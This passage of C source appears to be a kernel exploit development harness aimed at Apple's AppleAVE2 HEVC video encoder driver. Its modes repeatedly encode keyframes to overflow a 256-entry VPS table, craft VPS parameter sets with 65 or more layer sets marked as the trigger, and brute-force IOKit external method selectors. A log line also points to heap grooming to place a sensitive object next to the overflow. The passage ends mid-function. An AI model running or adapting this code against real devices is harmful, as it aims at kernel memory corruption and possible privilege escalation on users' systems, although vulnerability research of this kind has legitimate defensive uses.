                        CFArrayAppendValue(bArr, bufs[i]);
                    }
                    gs = CMTaggedBufferGroupCreate(NULL, tcArr, bArr, &grp);
                    CFRelease(tcArr); CFRelease(bArr);
                    for (int i = 0; i < nlayers; i++) CFRelease(tcs[i]);
                }

                if (gs != noErr || !grp) {
                    rlog("  CMTaggedBufferGroupCreateCombined(%d) FAILED: %d\n", nlayers, (int)gs);
                    for (int i = 0; i < nlayers; i++) CVPixelBufferRelease(pbs[i]);
                    VTCompressionSessionInvalidate(s);
                    CFRelease(s);
                    continue;
                }

                rlog("  Created TaggedBufferGroup with %d buffers\n", nlayers);

                /* Encode */
                g_encode_done = 0;
                g_cb_status = -999;
                g_last_pset_count = 0;
                g_last_pset_total_bytes = 0;
                CMTime pts = CMTimeMake(0, 30);
                CMTime dur = CMTimeMake(1, 30);

                CFMutableDictionaryRef fp = CFDictionaryCreateMutable(
                    NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(fp, kVTEncodeFrameOptionKey_ForceKeyFrame, kCFBooleanTrue);

                st = VTCompressionSessionEncodeMultiImageFrame(s, grp, pts, dur, fp, NULL, NULL);
                CFRelease(fp);
                rlog("  EncodeMultiImageFrame: %d\n", (int)st);

                if (st == noErr) {
                    for (int i = 0; i < 300 && !g_encode_done; i++) usleep(10000);
                    rlog("  Encode done=%d, cb_status=%d\n", g_encode_done, (int)g_cb_status);
                    rlog("  >>> pset_count=%zu, pset_bytes=%zu <<<\n",
                         g_last_pset_count, g_last_pset_total_bytes);

                    if (g_last_pset_count > 4) {
                        rlog("  *** %d layers produced %zu psets (expected ~%d) ***\n",
                             nlayers, g_last_pset_count, nlayers + 2);
                        if (g_last_pset_count >= (size_t)(nlayers + 1)) {
                            rlog("  *** CONFIRMED: layer count scales pset entries! ***\n");
                            int encodes_needed = (256 + (int)g_last_pset_count - 1) / (int)g_last_pset_count;
                            rlog("  *** %d encodes would reach 256 entries (OOB threshold) ***\n", encodes_needed);
                        }
                    }
                }

                CFRelease(grp);
                for (int i = 0; i < nlayers; i++) CVPixelBufferRelease(pbs[i]);
            } else {
                rlog("  VTCompressionSessionEncodeMultiImageFrame not available\n");
            }

            VTCompressionSessionInvalidate(s);
            CFRelease(s);
            rlog("\n");
        }

        rlog("=== MULTI-LAYER probe complete ===\n");
        rlog("If any layer count produces scaled pset entries, the overflow\n");
        rlog("threshold of 256 can be reached in fewer encodes.\n");

    } else if (strcmp(mode, "counter_accumulate") == 0) {
        /*
         * COUNTER_ACCUMULATE: Critical test based on callgraph analysis.
         *
         * Finding: The VPS table constructor (which zeros the counter) runs
         * ONLY during sAddClient (session creation). The sEncodeFrame path
         * writes entries WITHOUT resetting the counter. If the IOKit session
         * persists across VTCompressionSession encode calls, entries accumulate:
         *   - Standard HEVC: 3 pset entries/keyframe × 86 = 258 → OOB
         *   - MV-HEVC stereo: 5 entries/keyframe × 52 = 260 → OOB
         *
         * This mode encodes N keyframes on a single session and monitors for
         * ANY sign of kernel memory corruption at the 86+ encode boundary.
         * Tests both standard HEVC and MV-HEVC stereo paths.
         */
        int max_enc = 300;
        int use_stereo = 0;
        if (argc > 2) max_enc = atoi(argv[2]);
        if (argc > 3 && strcmp(argv[3], "stereo") == 0) use_stereo = 1;
        if (max_enc < 10) max_enc = 10;
        if (max_enc > 1000) max_enc = 1000;

        rlog("COUNTER_ACCUMULATE: %s HEVC, %d keyframe encodes\n",
             use_stereo ? "MV-HEVC stereo" : "Standard", max_enc);
        rlog("Theory: VPS table counter accumulates (constructor only at session create)\n");
        rlog("OOB boundary: ~86 encodes (standard) or ~52 (stereo)\n\n");

        CFMutableDictionaryRef es = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);

        if (use_stereo) {
            int hero = 0, nlayers = 2;
            int layers[] = {0, 1};
            CFNumberRef ln = CFNumberCreate(NULL, kCFNumberIntType, &nlayers);
            CFMutableArrayRef la = CFArrayCreateMutable(NULL, nlayers, &kCFTypeArrayCallBacks);
            for (int i = 0; i < nlayers; i++) {
                CFNumberRef lv = CFNumberCreate(NULL, kCFNumberIntType, &layers[i]);
                CFArrayAppendValue(la, lv); CFRelease(lv);
            }
            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &hero);
            CFDictionarySetValue(es, CFSTR("MVHEVCVideoLayerIDs"), la);
            CFDictionarySetValue(es, CFSTR("MVHEVCViewIDs"), la);
            CFDictionarySetValue(es, CFSTR("MVHEVCHeroEye"), hn);
            CFRelease(la); CFRelease(ln); CFRelease(hn);
        }

        VTCompressionSessionRef s = NULL;
        OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(es);
        rlog("Create: %d\n", (int)r);
        if (r != 0 || !s) goto done;

        VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        int kf = 1;
        CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
        CFRelease(kfn);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

        OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
        rlog("Prepare: %d\n\n", (int)pr);
        if (pr != 0) { VTCompressionSessionInvalidate(s); CFRelease(s); goto done; }

        size_t first_pset_count = 0, first_pset_bytes = 0;
        int first_error_at = -1;
        int errors = 0;
        uint64_t prev_time = 0;

        for (int i = 0; i < max_enc; i++) {
            struct timespec t0, t1;
            clock_gettime(CLOCK_MONOTONIC, &t0);

            int st;
            if (use_stereo) {
                st = encode_one_stereo_kf(s, i, 128, 128, 1, 1);
            } else {
                st = encode_one(s, i, 128, 128);
            }

            clock_gettime(CLOCK_MONOTONIC, &t1);
            uint64_t elapsed_us = (t1.tv_sec - t0.tv_sec) * 1000000ULL +
                                  (t1.tv_nsec - t0.tv_nsec) / 1000ULL;

            if (st != 0) {
                if (first_error_at < 0) first_error_at = i;
                errors++;
                rlog("[%03d] ERROR %d (elapsed %llu us)\n", i, st, elapsed_us);
                if (errors > 5) {
                    rlog("Too many errors, stopping\n");
                    break;
                }
                continue;
            }

            if (i == 0) {
                first_pset_count = g_last_pset_count;
                first_pset_bytes = g_last_pset_total_bytes;
                rlog("[%03d] baseline: psets=%zu bytes=%zu elapsed=%llu us\n",
                     i, first_pset_count, first_pset_bytes, elapsed_us);
            }

            /* Log at key boundaries and periodically */
            int is_boundary = (i >= 45 && i <= 55) || (i >= 80 && i <= 92) ||
                              (i >= 150 && i <= 160) || (i >= 250 && i <= 260);
            int is_periodic = (i % 25 == 0);

            if (is_boundary || is_periodic || i == max_enc - 1) {
                int estimated_entries = (int)first_pset_count * (i + 1);
                rlog("[%03d] psets=%zu bytes=%zu elapsed=%llu us (est. table entries: %d%s)\n",
                     i, g_last_pset_count, g_last_pset_total_bytes, elapsed_us,
                     estimated_entries,
                     estimated_entries >= 256 ? " *** OOB ***" : "");
            }

            /* Detect anomalies: pset count change, timing spike, etc. */
            if (g_last_pset_count != first_pset_count && i > 0) {
                rlog("[%03d] *** PSET COUNT CHANGED: %zu → %zu (was %zu) ***\n",
                     i, first_pset_count, g_last_pset_count, first_pset_count);
            }
            if (g_last_pset_total_bytes != first_pset_bytes && i > 0) {
                int64_t delta = (int64_t)g_last_pset_total_bytes - (int64_t)first_pset_bytes;
                if (delta != 0 && (is_boundary || i % 25 == 0)) {
                    rlog("[%03d] PSET BYTES DELTA: %+lld (now %zu, baseline %zu)\n",
                         i, delta, g_last_pset_total_bytes, first_pset_bytes);
                }
            }
            if (elapsed_us > 100000 && prev_time > 0 && elapsed_us > prev_time * 3) {
                rlog("[%03d] *** TIMING SPIKE: %llu us (prev %llu) ***\n",
                     i, elapsed_us, prev_time);
            }
            prev_time = elapsed_us;
        }

        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        rlog("\n=== COUNTER_ACCUMULATE RESULTS ===\n");
        rlog("Encodes completed: %d (errors: %d)\n", max_enc, errors);
        rlog("First error at encode: %d\n", first_error_at);
        rlog("Per-frame psets: %zu, bytes: %zu\n", first_pset_count, first_pset_bytes);
        int total_entries = (int)first_pset_count * max_enc;
        rlog("Estimated total table entries: %d\n", total_entries);
        rlog("OOB threshold: 256 entries (~%d encodes)\n",
             first_pset_count > 0 ? (256 / (int)first_pset_count + 1) : 0);

        if (first_error_at >= 80 && first_error_at <= 95 && !use_stereo) {
            rlog("\n*** ERROR NEAR OOB BOUNDARY (86 encodes) — COUNTER MAY ACCUMULATE ***\n");
            rlog("*** This suggests the IOKit session persists and entries overflow ***\n");
        } else if (first_error_at >= 45 && first_error_at <= 60 && use_stereo) {
            rlog("\n*** ERROR NEAR STEREO OOB BOUNDARY — COUNTER MAY ACCUMULATE ***\n");
        } else if (errors == 0 && max_enc > 100) {
            rlog("\nNo errors after %d encodes. Possible explanations:\n", max_enc);
            rlog("  1. IOKit session recycled per encode (counter resets)\n");
            rlog("  2. Overflow into unused padding (no visible effect)\n");
            rlog("  3. VTCompressionSession resets state internally\n");
            rlog("Next: Try session_reuse_groom to place sensitive object adjacent\n");
        }

        VTCompressionSessionInvalidate(s);
        CFRelease(s);

    } else if (strcmp(mode, "iokit_vps") == 0) {
        /*
         * iokit_vps — Direct IOKit probe of AppleAVE2 service
         *
         * Session 28 breakthrough: The VPS counter does NOT accumulate through
         * VTCompressionSession. The fix (AVE_HEVC_CheckVPSExtBounds) adds bounds
         * checks on VPS extension arrays (dim 64) during sAddClient parsing.
         * The overflow requires a crafted VPS with vps_num_layer_sets_minus1 > 63.
         *
         * This mode:
         * 1. Opens AppleAVE2 IOKit service directly
         * 2. Enumerates external methods and their input sizes
         * 3. Tests sAddClient (selector 0) with a standard session first
         * 4. Attempts sSessionSettings (selector 3) with crafted VPS config
         *
         * Usage: iokit_vps [phase]
         *   phase 1: Enumerate service + test normal session (safe)
         *   phase 2: Probe sSessionSettings with VPS extension data
         *   phase 3: Craft VPS with 65+ layer sets (TRIGGER)
         */
        int phase = (argc > 2) ? atoi(argv[2]) : 1;
        rlog("=== IOKit Direct VPS Probe (Phase %d) ===\n\n", phase);

        /* Step 1: Find and open AppleAVE2 service */
        io_service_t service = IOServiceGetMatchingService(
            kIOMasterPortDefault,
            IOServiceMatching("AppleAVE2Driver"));
        if (!service) {
            service = IOServiceGetMatchingService(
                kIOMasterPortDefault,
                IOServiceMatching("AppleAVE2"));
        }
        if (!service) {
            /* Try iterating to find the actual service name */
            rlog("AppleAVE2Driver/AppleAVE2 not found, searching...\n");
            io_iterator_t iter;
            kern_return_t kr = IOServiceGetMatchingServices(
                kIOMasterPortDefault,
                IOServiceMatching("IOService"),
                &iter);
            if (kr == KERN_SUCCESS) {
                io_service_t svc;
                int found = 0;
                while ((svc = IOIteratorNext(iter)) != 0) {
                    io_name_t name;
                    IORegistryEntryGetName(svc, name);
                    if (strstr(name, "AVE") || strstr(name, "ave") ||
                        strstr(name, "VideoEncoder")) {
                        rlog("  Found: %s\n", name);
                        if (!found) { service = svc; found = 1; }
                        else IOObjectRelease(svc);
                    } else {
                        IOObjectRelease(svc);
                    }
                }
                IOObjectRelease(iter);
            }
        }

        if (!service) {
            rlog("ERROR: Could not find AppleAVE2 IOKit service\n");
            rlog("This may require a VTCompressionSession to be active first\n");
            goto done;
        }

        io_name_t svc_name;
        IORegistryEntryGetName(service, svc_name);
        rlog("Found service: %s\n", svc_name);

        /* Get service properties */
        CFMutableDictionaryRef props = NULL;
        IORegistryEntryCreateCFProperties(service, &props,
            kCFAllocatorDefault, 0);
        if (props) {
            rlog("Service has properties dict\n");

            /* Look for IOUserClientClass */
            CFTypeRef uc_class = CFDictionaryGetValue(props,
                CFSTR("IOUserClientClass"));
            if (uc_class && CFGetTypeID(uc_class) == CFStringGetTypeID()) {
                char buf[256];
                CFStringGetCString(uc_class, buf, sizeof(buf),
                    kCFStringEncodingUTF8);
                rlog("IOUserClientClass: %s\n", buf);
            }

            CFRelease(props);
        }

        /* Open user client connection */
        io_connect_t conn = 0;
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
        rlog("IOServiceOpen: kr=0x%x conn=%u\n", kr, conn);

        if (kr != KERN_SUCCESS) {
            rlog("Failed to open user client (0x%x)\n", kr);
            rlog("Common reasons:\n");
            rlog("  - Service requires entitlement\n");
            rlog("  - Service is already opened by mediaserverd\n");
            rlog("  - Need to match via VTCompressionSession first\n\n");

            /* Try opening via VTCompressionSession to get mediaserverd's connection */
            rlog("--- Fallback: Create VTCompressionSession + probe IOKit ---\n");
            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks,
                &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                kCFBooleanTrue);
            CFDictionarySetValue(enc_spec,
                CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                kCFBooleanTrue);
            OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
                encode_cb, NULL, &s);
            CFRelease(enc_spec);

            if (st == noErr && s) {
                rlog("VTCompressionSession created (keeps mediaserverd's IOKit session alive)\n");

                /* Now try to find IOKit connection details */
                rlog("\nProbing IOKit registry for AVE user clients...\n");

                io_iterator_t child_iter;
                kern_return_t kr2 = IORegistryEntryGetChildIterator(
                    service, kIOServicePlane, &child_iter);
                if (kr2 == KERN_SUCCESS) {
                    io_service_t child;
                    while ((child = IOIteratorNext(child_iter)) != 0) {
                        io_name_t cname;
                        IORegistryEntryGetName(child, cname);
                        rlog("  Child: %s\n", cname);
                        IOObjectRelease(child);
                    }
                    IOObjectRelease(child_iter);
                }

                /* Encode one frame to fully initialize the hardware path */
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime,
                    kCFBooleanTrue);
                int kf = 1;
                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
                VTSessionSetProperty(s,
                    kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
                CFRelease(kfn);

                g_encode_done = 0;
                encode_one(s, 0, 128, 128);
                for (int w = 0; w < 500 && !g_encode_done; w++) usleep(10000);
                rlog("First encode: status=%d psets=%zu bytes=%zu\n",
                    (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);

                /* Now try IOServiceOpen again - maybe the service is now warm */
                io_connect_t conn2 = 0;
                kr = IOServiceOpen(service, mach_task_self(), 0, &conn2);
                rlog("\nRetry IOServiceOpen after VT init: kr=0x%x conn=%u\n", kr, conn2);

                if (kr == KERN_SUCCESS && conn2) {
                    rlog("SUCCESS: Got IOKit connection!\n");
                    conn = conn2;
                } else {
                    rlog("Still can't open directly (expected - mediaserverd owns it)\n");

                    /* Try different client types */
                    for (uint32_t ctype = 0; ctype <= 5; ctype++) {
                        kr = IOServiceOpen(service, mach_task_self(), ctype, &conn2);
                        if (kr == KERN_SUCCESS) {
                            rlog("IOServiceOpen type=%u: SUCCESS conn=%u\n", ctype, conn2);
                            conn = conn2;
                            break;
                        }
                        rlog("IOServiceOpen type=%u: 0x%x\n", ctype, kr);
                    }
                }

                if (phase >= 2 && conn) {
                    rlog("\n--- Phase 2: Probe External Methods ---\n");

                    /* Test each external method selector to discover input sizes */
                    for (uint32_t sel = 0; sel <= 15; sel++) {
                        uint64_t input[16] = {0};
                        uint64_t output[16] = {0};
                        uint32_t out_cnt = 16;

                        kr = IOConnectCallScalarMethod(conn, sel,
                            input, 0, output, &out_cnt);
                        rlog("  Selector %u (scalar, 0 in): kr=0x%x out_cnt=%u\n",
                            sel, kr, out_cnt);

                        /* Also try struct method */
                        uint8_t struct_in[4096] = {0};
                        uint8_t struct_out[4096] = {0};
                        size_t struct_out_sz = sizeof(struct_out);

                        kr = IOConnectCallStructMethod(conn, sel,
                            struct_in, 64, struct_out, &struct_out_sz);
                        rlog("  Selector %u (struct, 64 in): kr=0x%x out_sz=%zu\n",
                            sel, kr, struct_out_sz);
                    }
                }

                if (phase >= 3 && conn) {
                    rlog("\n--- Phase 3: Craft VPS Extension Data ---\n");
                    rlog("Building VPS with 65 layer sets...\n");

                    /*
                     * HEVC VPS extension structure fields to overflow:
                     * - vps_num_layer_sets_minus1: 10 bits, range 0..1023
                     * - Array at +0x17FB: per-layer-set data, dim 64
                     * - Array at +0x1A40: output layer set accumulator
                     * - Array at +0x1A41: 2D per-dimension data, stride 64
                     *
                     * We need to encode these in the sSessionSettings
                     * input structure at the right offsets.
                     */

                    /* Try sSessionSettings (selector 3) with crafted data */
                    /* The input structure contains the HEVC configuration
                     * including VPS data. We need to figure out the layout. */

                    uint8_t settings_buf[16384];
                    memset(settings_buf, 0, sizeof(settings_buf));

                    /* Write vps_num_layer_sets_minus1 = 65 at various
                     * candidate offsets in the settings structure */
                    uint32_t test_vals[] = {65, 128, 255};

                    for (int tv = 0; tv < 3; tv++) {
                        uint32_t val = test_vals[tv];
                        rlog("Testing layer_sets=%u...\n", val);

                        /* Try a few likely offsets for the layer set count */
                        int offsets[] = {4, 8, 0x10, 0x20, 0x40, 0x80, 0x100,
                            0x1880 + 4}; /* +0x1880 is VPS ext base */
                        for (int oi = 0; oi < 8; oi++) {
                            memset(settings_buf, 0, sizeof(settings_buf));
                            int off = offsets[oi];
                            if (off + 4 > (int)sizeof(settings_buf)) continue;
                            memcpy(&settings_buf[off], &val, 4);

                            size_t out_sz = 4096;
                            uint8_t out_buf[4096] = {0};
                            kr = IOConnectCallStructMethod(conn, 3,
                                settings_buf, 4096, out_buf, &out_sz);
                            rlog("  offset=0x%x: kr=0x%x out_sz=%zu\n",
                                off, kr, out_sz);
                        }
                    }
                }

                VTCompressionSessionInvalidate(s);
                CFRelease(s);
            } else {
                rlog("VTCompressionSession create failed: %d\n", (int)st);
            }
        } else {
            rlog("Direct IOKit connection acquired!\n");

            /* Enumerate selectors */
            rlog("\n--- Enumerating External Methods ---\n");
            for (uint32_t sel = 0; sel <= 15; sel++) {
                uint64_t out[16] = {0};
                uint32_t out_cnt = 16;
                kr = IOConnectCallScalarMethod(conn, sel,
                    NULL, 0, out, &out_cnt);
                rlog("  Selector %u: kr=0x%x out_cnt=%u\n", sel, kr, out_cnt);
            }
        }

        if (conn) IOServiceClose(conn);
        IOObjectRelease(service);

    } else if (strcmp(mode, "iokit_enum") == 0) {
        /*
         * iokit_enum — Enumerate ALL IOKit services related to video encoding
         * This helps discover the exact service name and hierarchy.
         */
        rlog("=== IOKit Video Encoder Service Enumeration ===\n\n");

        /* Search for AVE-related services */
        const char *search_terms[] = {
            "AVE", "VideoEncoder", "AppleAVE", "H265", "HEVC",
            "MediaCodec", "VideoCodec", NULL
        };

        io_iterator_t iter;
        kern_return_t kr = IOServiceGetMatchingServices(
            kIOMasterPortDefault,
            IOServiceMatching("IOService"),
            &iter);

        if (kr != KERN_SUCCESS) {
            rlog("Failed to get IOService iterator: 0x%x\n", kr);
            goto done;
        }

        io_service_t svc;
        int found_count = 0;
        while ((svc = IOIteratorNext(iter)) != 0) {
            io_name_t name;
            IORegistryEntryGetName(svc, name);

            int match = 0;
            for (int i = 0; search_terms[i]; i++) {
                if (strcasestr(name, search_terms[i])) {
                    match = 1;
                    break;
                }
            }

            if (match) {
                found_count++;
                rlog("[%d] %s\n", found_count, name);

                /* Get class name */
                io_name_t class_name;
                IOObjectGetClass(svc, class_name);
                rlog("    Class: %s\n", class_name);

                /* Get path */
                io_string_t path;
                if (IORegistryEntryGetPath(svc, kIOServicePlane, path) == KERN_SUCCESS) {
                    rlog("    Path: %s\n", path);
                }

                /* Get properties */
                CFMutableDictionaryRef props = NULL;
                IORegistryEntryCreateCFProperties(svc, &props,
                    kCFAllocatorDefault, 0);
                if (props) {
                    CFTypeRef uc = CFDictionaryGetValue(props,
                        CFSTR("IOUserClientClass"));
                    if (uc && CFGetTypeID(uc) == CFStringGetTypeID()) {
                        char buf[256];
                        CFStringGetCString(uc, buf, sizeof(buf),
                            kCFStringEncodingUTF8);
                        rlog("    IOUserClientClass: %s\n", buf);
                    }

                    CFTypeRef cm = CFDictionaryGetValue(props,
                        CFSTR("IOClass"));
                    if (cm && CFGetTypeID(cm) == CFStringGetTypeID()) {
                        char buf[256];
                        CFStringGetCString(cm, buf, sizeof(buf),
                            kCFStringEncodingUTF8);
                        rlog("    IOClass: %s\n", buf);
                    }

                    /* Check for external method metadata */
                    CFTypeRef methods = CFDictionaryGetValue(props,
                        CFSTR("IOExternalMethodCount"));
                    if (methods) {
                        rlog("    Has IOExternalMethodCount\n");
                    }

                    CFRelease(props);
                }

                /* Try opening */
                io_connect_t c = 0;
                for (uint32_t t = 0; t <= 3; t++) {
                    kr = IOServiceOpen(svc, mach_task_self(), t, &c);
                    if (kr == KERN_SUCCESS) {
                        rlog("    IOServiceOpen(type=%u): SUCCESS conn=%u\n", t, c);
                        IOServiceClose(c);
                    } else {
                        rlog("    IOServiceOpen(type=%u): 0x%x\n", t, kr);
                    }
                }

                rlog("\n");
            }
            IOObjectRelease(svc);
        }
        IOObjectRelease(iter);

        rlog("Found %d AVE/video-related services\n", found_count);

    } else if (strcmp(mode, "transcode_vps") == 0) {
        /*
         * transcode_vps — Decode crafted VPS bitstream then re-encode.
         * If mediaserverd preserves format description metadata during
         * the decode→encode pipeline, the crafted VPS fields may reach
         * the encoder's sAddClient through the re-encode path.
         */
        rlog("=== Transcode VPS Injection Test ===\n\n");

        /* Build crafted parameter sets */
        uint8_t vps_nal[8192];
        size_t vps_len = build_crafted_vps(vps_nal, sizeof(vps_nal), 65);
        uint8_t sps_nal[256];
        size_t sps_len = build_minimal_sps(sps_nal, sizeof(sps_nal));
        uint8_t pps_nal[128];
        size_t pps_len = build_minimal_pps(pps_nal, sizeof(pps_nal));

        const uint8_t *psets[] = { vps_nal, sps_nal, pps_nal };
        size_t psizes[] = { vps_len, sps_len, pps_len };

        CMFormatDescriptionRef crafted_fmt = NULL;
        OSStatus st = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
            NULL, 3, psets, psizes, 4, NULL, &crafted_fmt);
        rlog("Crafted format (65 layer sets): %d\n", (int)st);
        if (st != 0 || !crafted_fmt) goto done;

        /* Log format extensions */
        CFDictionaryRef exts = CMFormatDescriptionGetExtensions(crafted_fmt);
        if (exts) {
            CFIndex cnt = CFDictionaryGetCount(exts);
            rlog("Format has %ld extension keys\n", (long)cnt);
        }

        /* Create decoder with crafted format */
        rlog("Creating decoder with crafted format...\n");
        VTDecompressionSessionRef decomp = NULL;
        g_decoded_pb = NULL;
        g_decode_got_frame = 0;

        VTDecompressionOutputCallbackRecord dec_cb;
        dec_cb.decompressionOutputRefCon = NULL;
        dec_cb.decompressionOutputCallback = decode_cb;

        /* Destination pixel buffer attributes */
        CFMutableDictionaryRef dest = CFDictionaryCreateMutable(NULL, 1,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        int pf = kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange;
        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
        CFDictionarySetValue(dest, kCVPixelBufferPixelFormatTypeKey, pfn);
        CFRelease(pfn);

        st = VTDecompressionSessionCreate(NULL, crafted_fmt,
            NULL, dest, &dec_cb, &decomp);
        CFRelease(dest);
        rlog("Decoder create: %d\n", (int)st);

        if (st != 0 || !decomp) {
            rlog("Failed to create decoder\n");
            CFRelease(crafted_fmt);
            goto done;
        }

        /* Create a fake IDR frame to decode */
        uint8_t fake_slice[16] = {
            0x00, 0x00, 0x00, 0x08,
            0x26, 0x01, 0xAF, 0x09, 0x40, 0x00, 0x00, 0x00
        };

        CMBlockBufferRef block = NULL;
        st = CMBlockBufferCreateWithMemoryBlock(NULL,
            fake_slice, sizeof(fake_slice), NULL, NULL,
            0, sizeof(fake_slice), 0, &block);

        if (st == 0 && block) {
            CMSampleBufferRef sample = NULL;
            CMSampleTimingInfo timing = {
                .duration = CMTimeMake(1, 30),
                .presentationTimeStamp = CMTimeMake(0, 30),
                .decodeTimeStamp = kCMTimeInvalid
            };
            size_t ssize = sizeof(fake_slice);
            st = CMSampleBufferCreate(NULL, block, true, NULL, NULL,
                crafted_fmt, 1, 1, &timing, 1, &ssize, &sample);

            if (st == 0 && sample) {
                VTDecodeFrameFlags flags = kVTDecodeFrame_EnableAsynchronousDecompression;
                VTDecodeInfoFlags info = 0;
                st = VTDecompressionSessionDecodeFrame(decomp,
                    sample, flags, NULL, &info);
                rlog("DecodeFrame: %d (info=0x%x)\n", (int)st, (unsigned)info);

                VTDecompressionSessionWaitForAsynchronousFrames(decomp);
                rlog("Got decoded frame: %d\n", g_decode_got_frame);

                if (g_decoded_pb) {
                    rlog("Decoded pixel buffer: %lux%lu\n",
                        CVPixelBufferGetWidth(g_decoded_pb),
                        CVPixelBufferGetHeight(g_decoded_pb));

                    /* Check if the decoded buffer carries format metadata */
                    CFDictionaryRef attachments = CVBufferCopyAttachments(
                        g_decoded_pb, kCVAttachmentMode_ShouldPropagate);
                    if (attachments) {
                        CFIndex kcnt = CFDictionaryGetCount(attachments);
                        rlog("Decoded buffer has %ld propagating attachments\n",
                            (long)kcnt);
                        CFRelease(attachments);
                    }

                    /* Now re-encode this buffer through HEVC encoder */
                    rlog("\n--- Re-encoding decoded buffer ---\n");
                    VTCompressionSessionRef enc = NULL;
                    st = VTCompressionSessionCreate(NULL, 128, 128,
                        kCMVideoCodecType_HEVC, NULL, NULL, NULL,
                        encode_cb, NULL, &enc);
                    rlog("Encoder create: %d\n", (int)st);

                    if (st == 0 && enc) {
                        st = VTCompressionSessionPrepareToEncodeFrames(enc);
                        g_encode_done = 0;
                        g_cb_count = 0;

                        CMTime pts2 = CMTimeMake(0, 30);
                        const void *fk[] = { kVTEncodeFrameOptionKey_ForceKeyFrame };
                        const void *fv[] = { kCFBooleanTrue };
                        CFDictionaryRef fp = CFDictionaryCreate(NULL, fk, fv, 1,
                            &kCFTypeDictionaryKeyCallBacks,
                            &kCFTypeDictionaryValueCallBacks);

                        st = VTCompressionSessionEncodeFrame(enc, (CVPixelBufferRef)g_decoded_pb,
                            pts2, kCMTimeInvalid, fp, NULL, NULL);
                        rlog("Re-encode: %d\n", (int)st);
                        CFRelease(fp);

                        for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
                        VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);

                        rlog("Callback count: %d, status: %d\n",
                            g_cb_count, (int)g_cb_status);

                        if (g_saved_fmt) {
                            rlog("Re-encoded output parameter sets:\n");
                            dump_psets(g_saved_fmt, 0);

                            const uint8_t *out_vps = NULL;
                            size_t out_vps_sz = 0;
                            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                                g_saved_fmt, 0, &out_vps, &out_vps_sz, NULL, NULL);
                            rlog("Re-encoded VPS: %zu bytes (crafted=%zu)\n",
                                out_vps_sz, vps_len);
                            CFRelease(g_saved_fmt);
                            g_saved_fmt = NULL;
                        }

                        VTCompressionSessionInvalidate(enc);
                        CFRelease(enc);
                    }
                    CVPixelBufferRelease((CVPixelBufferRef)g_decoded_pb);
                    g_decoded_pb = NULL;
                }
                CFRelease(sample);
            }
            CFRelease(block);
        }

        VTDecompressionSessionInvalidate(decomp);
        CFRelease(decomp);
        CFRelease(crafted_fmt);

    } else if (strcmp(mode, "vps_verify") == 0) {
        /*
         * vps_verify — Verify whether crafted VPS reaches the kernel
         * by examining the output format description from the encode callback.
         * Also tries creating encoder with crafted format as source attributes.
         */
        rlog("=== VPS Kernel Delivery Verification ===\n\n");

        /* Step 1: Normal encode — capture baseline VPS from output */
        rlog("--- Step 1: Baseline encode (no crafted VPS) ---\n");
        {
            VTCompressionSessionRef session = NULL;
            OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, NULL, NULL, NULL,
                encode_cb, NULL, &session);
            if (st != 0) { rlog("FAIL create: %d\n", (int)st); goto done; }

            st = VTCompressionSessionPrepareToEncodeFrames(session);
            g_encode_done = 0;
            encode_one(session, 0, 128, 128);
            for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
            st = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);

            if (g_saved_fmt) {
                rlog("Baseline output parameter sets:\n");
                dump_psets(g_saved_fmt, 0);

                /* Extract VPS from baseline */
                const uint8_t *vps_ptr = NULL;
                size_t vps_sz = 0;
                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    g_saved_fmt, 0, &vps_ptr, &vps_sz, NULL, NULL);
                rlog("Baseline VPS: %zu bytes\n", vps_sz);
                if (vps_ptr && vps_sz > 4) {
                    rlog("  First 32 bytes: ");
                    for (size_t j = 0; j < 32 && j < vps_sz; j++)
                        rlog("%02x", vps_ptr[j]);
                    rlog("\n");
                }
                CFRelease(g_saved_fmt);
                g_saved_fmt = NULL;
            }

            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }

        /* Step 2: Encode with crafted VPS attached — compare output */
        rlog("\n--- Step 2: Encode with crafted VPS attachment ---\n");
        {
            VTCompressionSessionRef session = NULL;
            OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, NULL, NULL, NULL,
                encode_cb, NULL, &session);
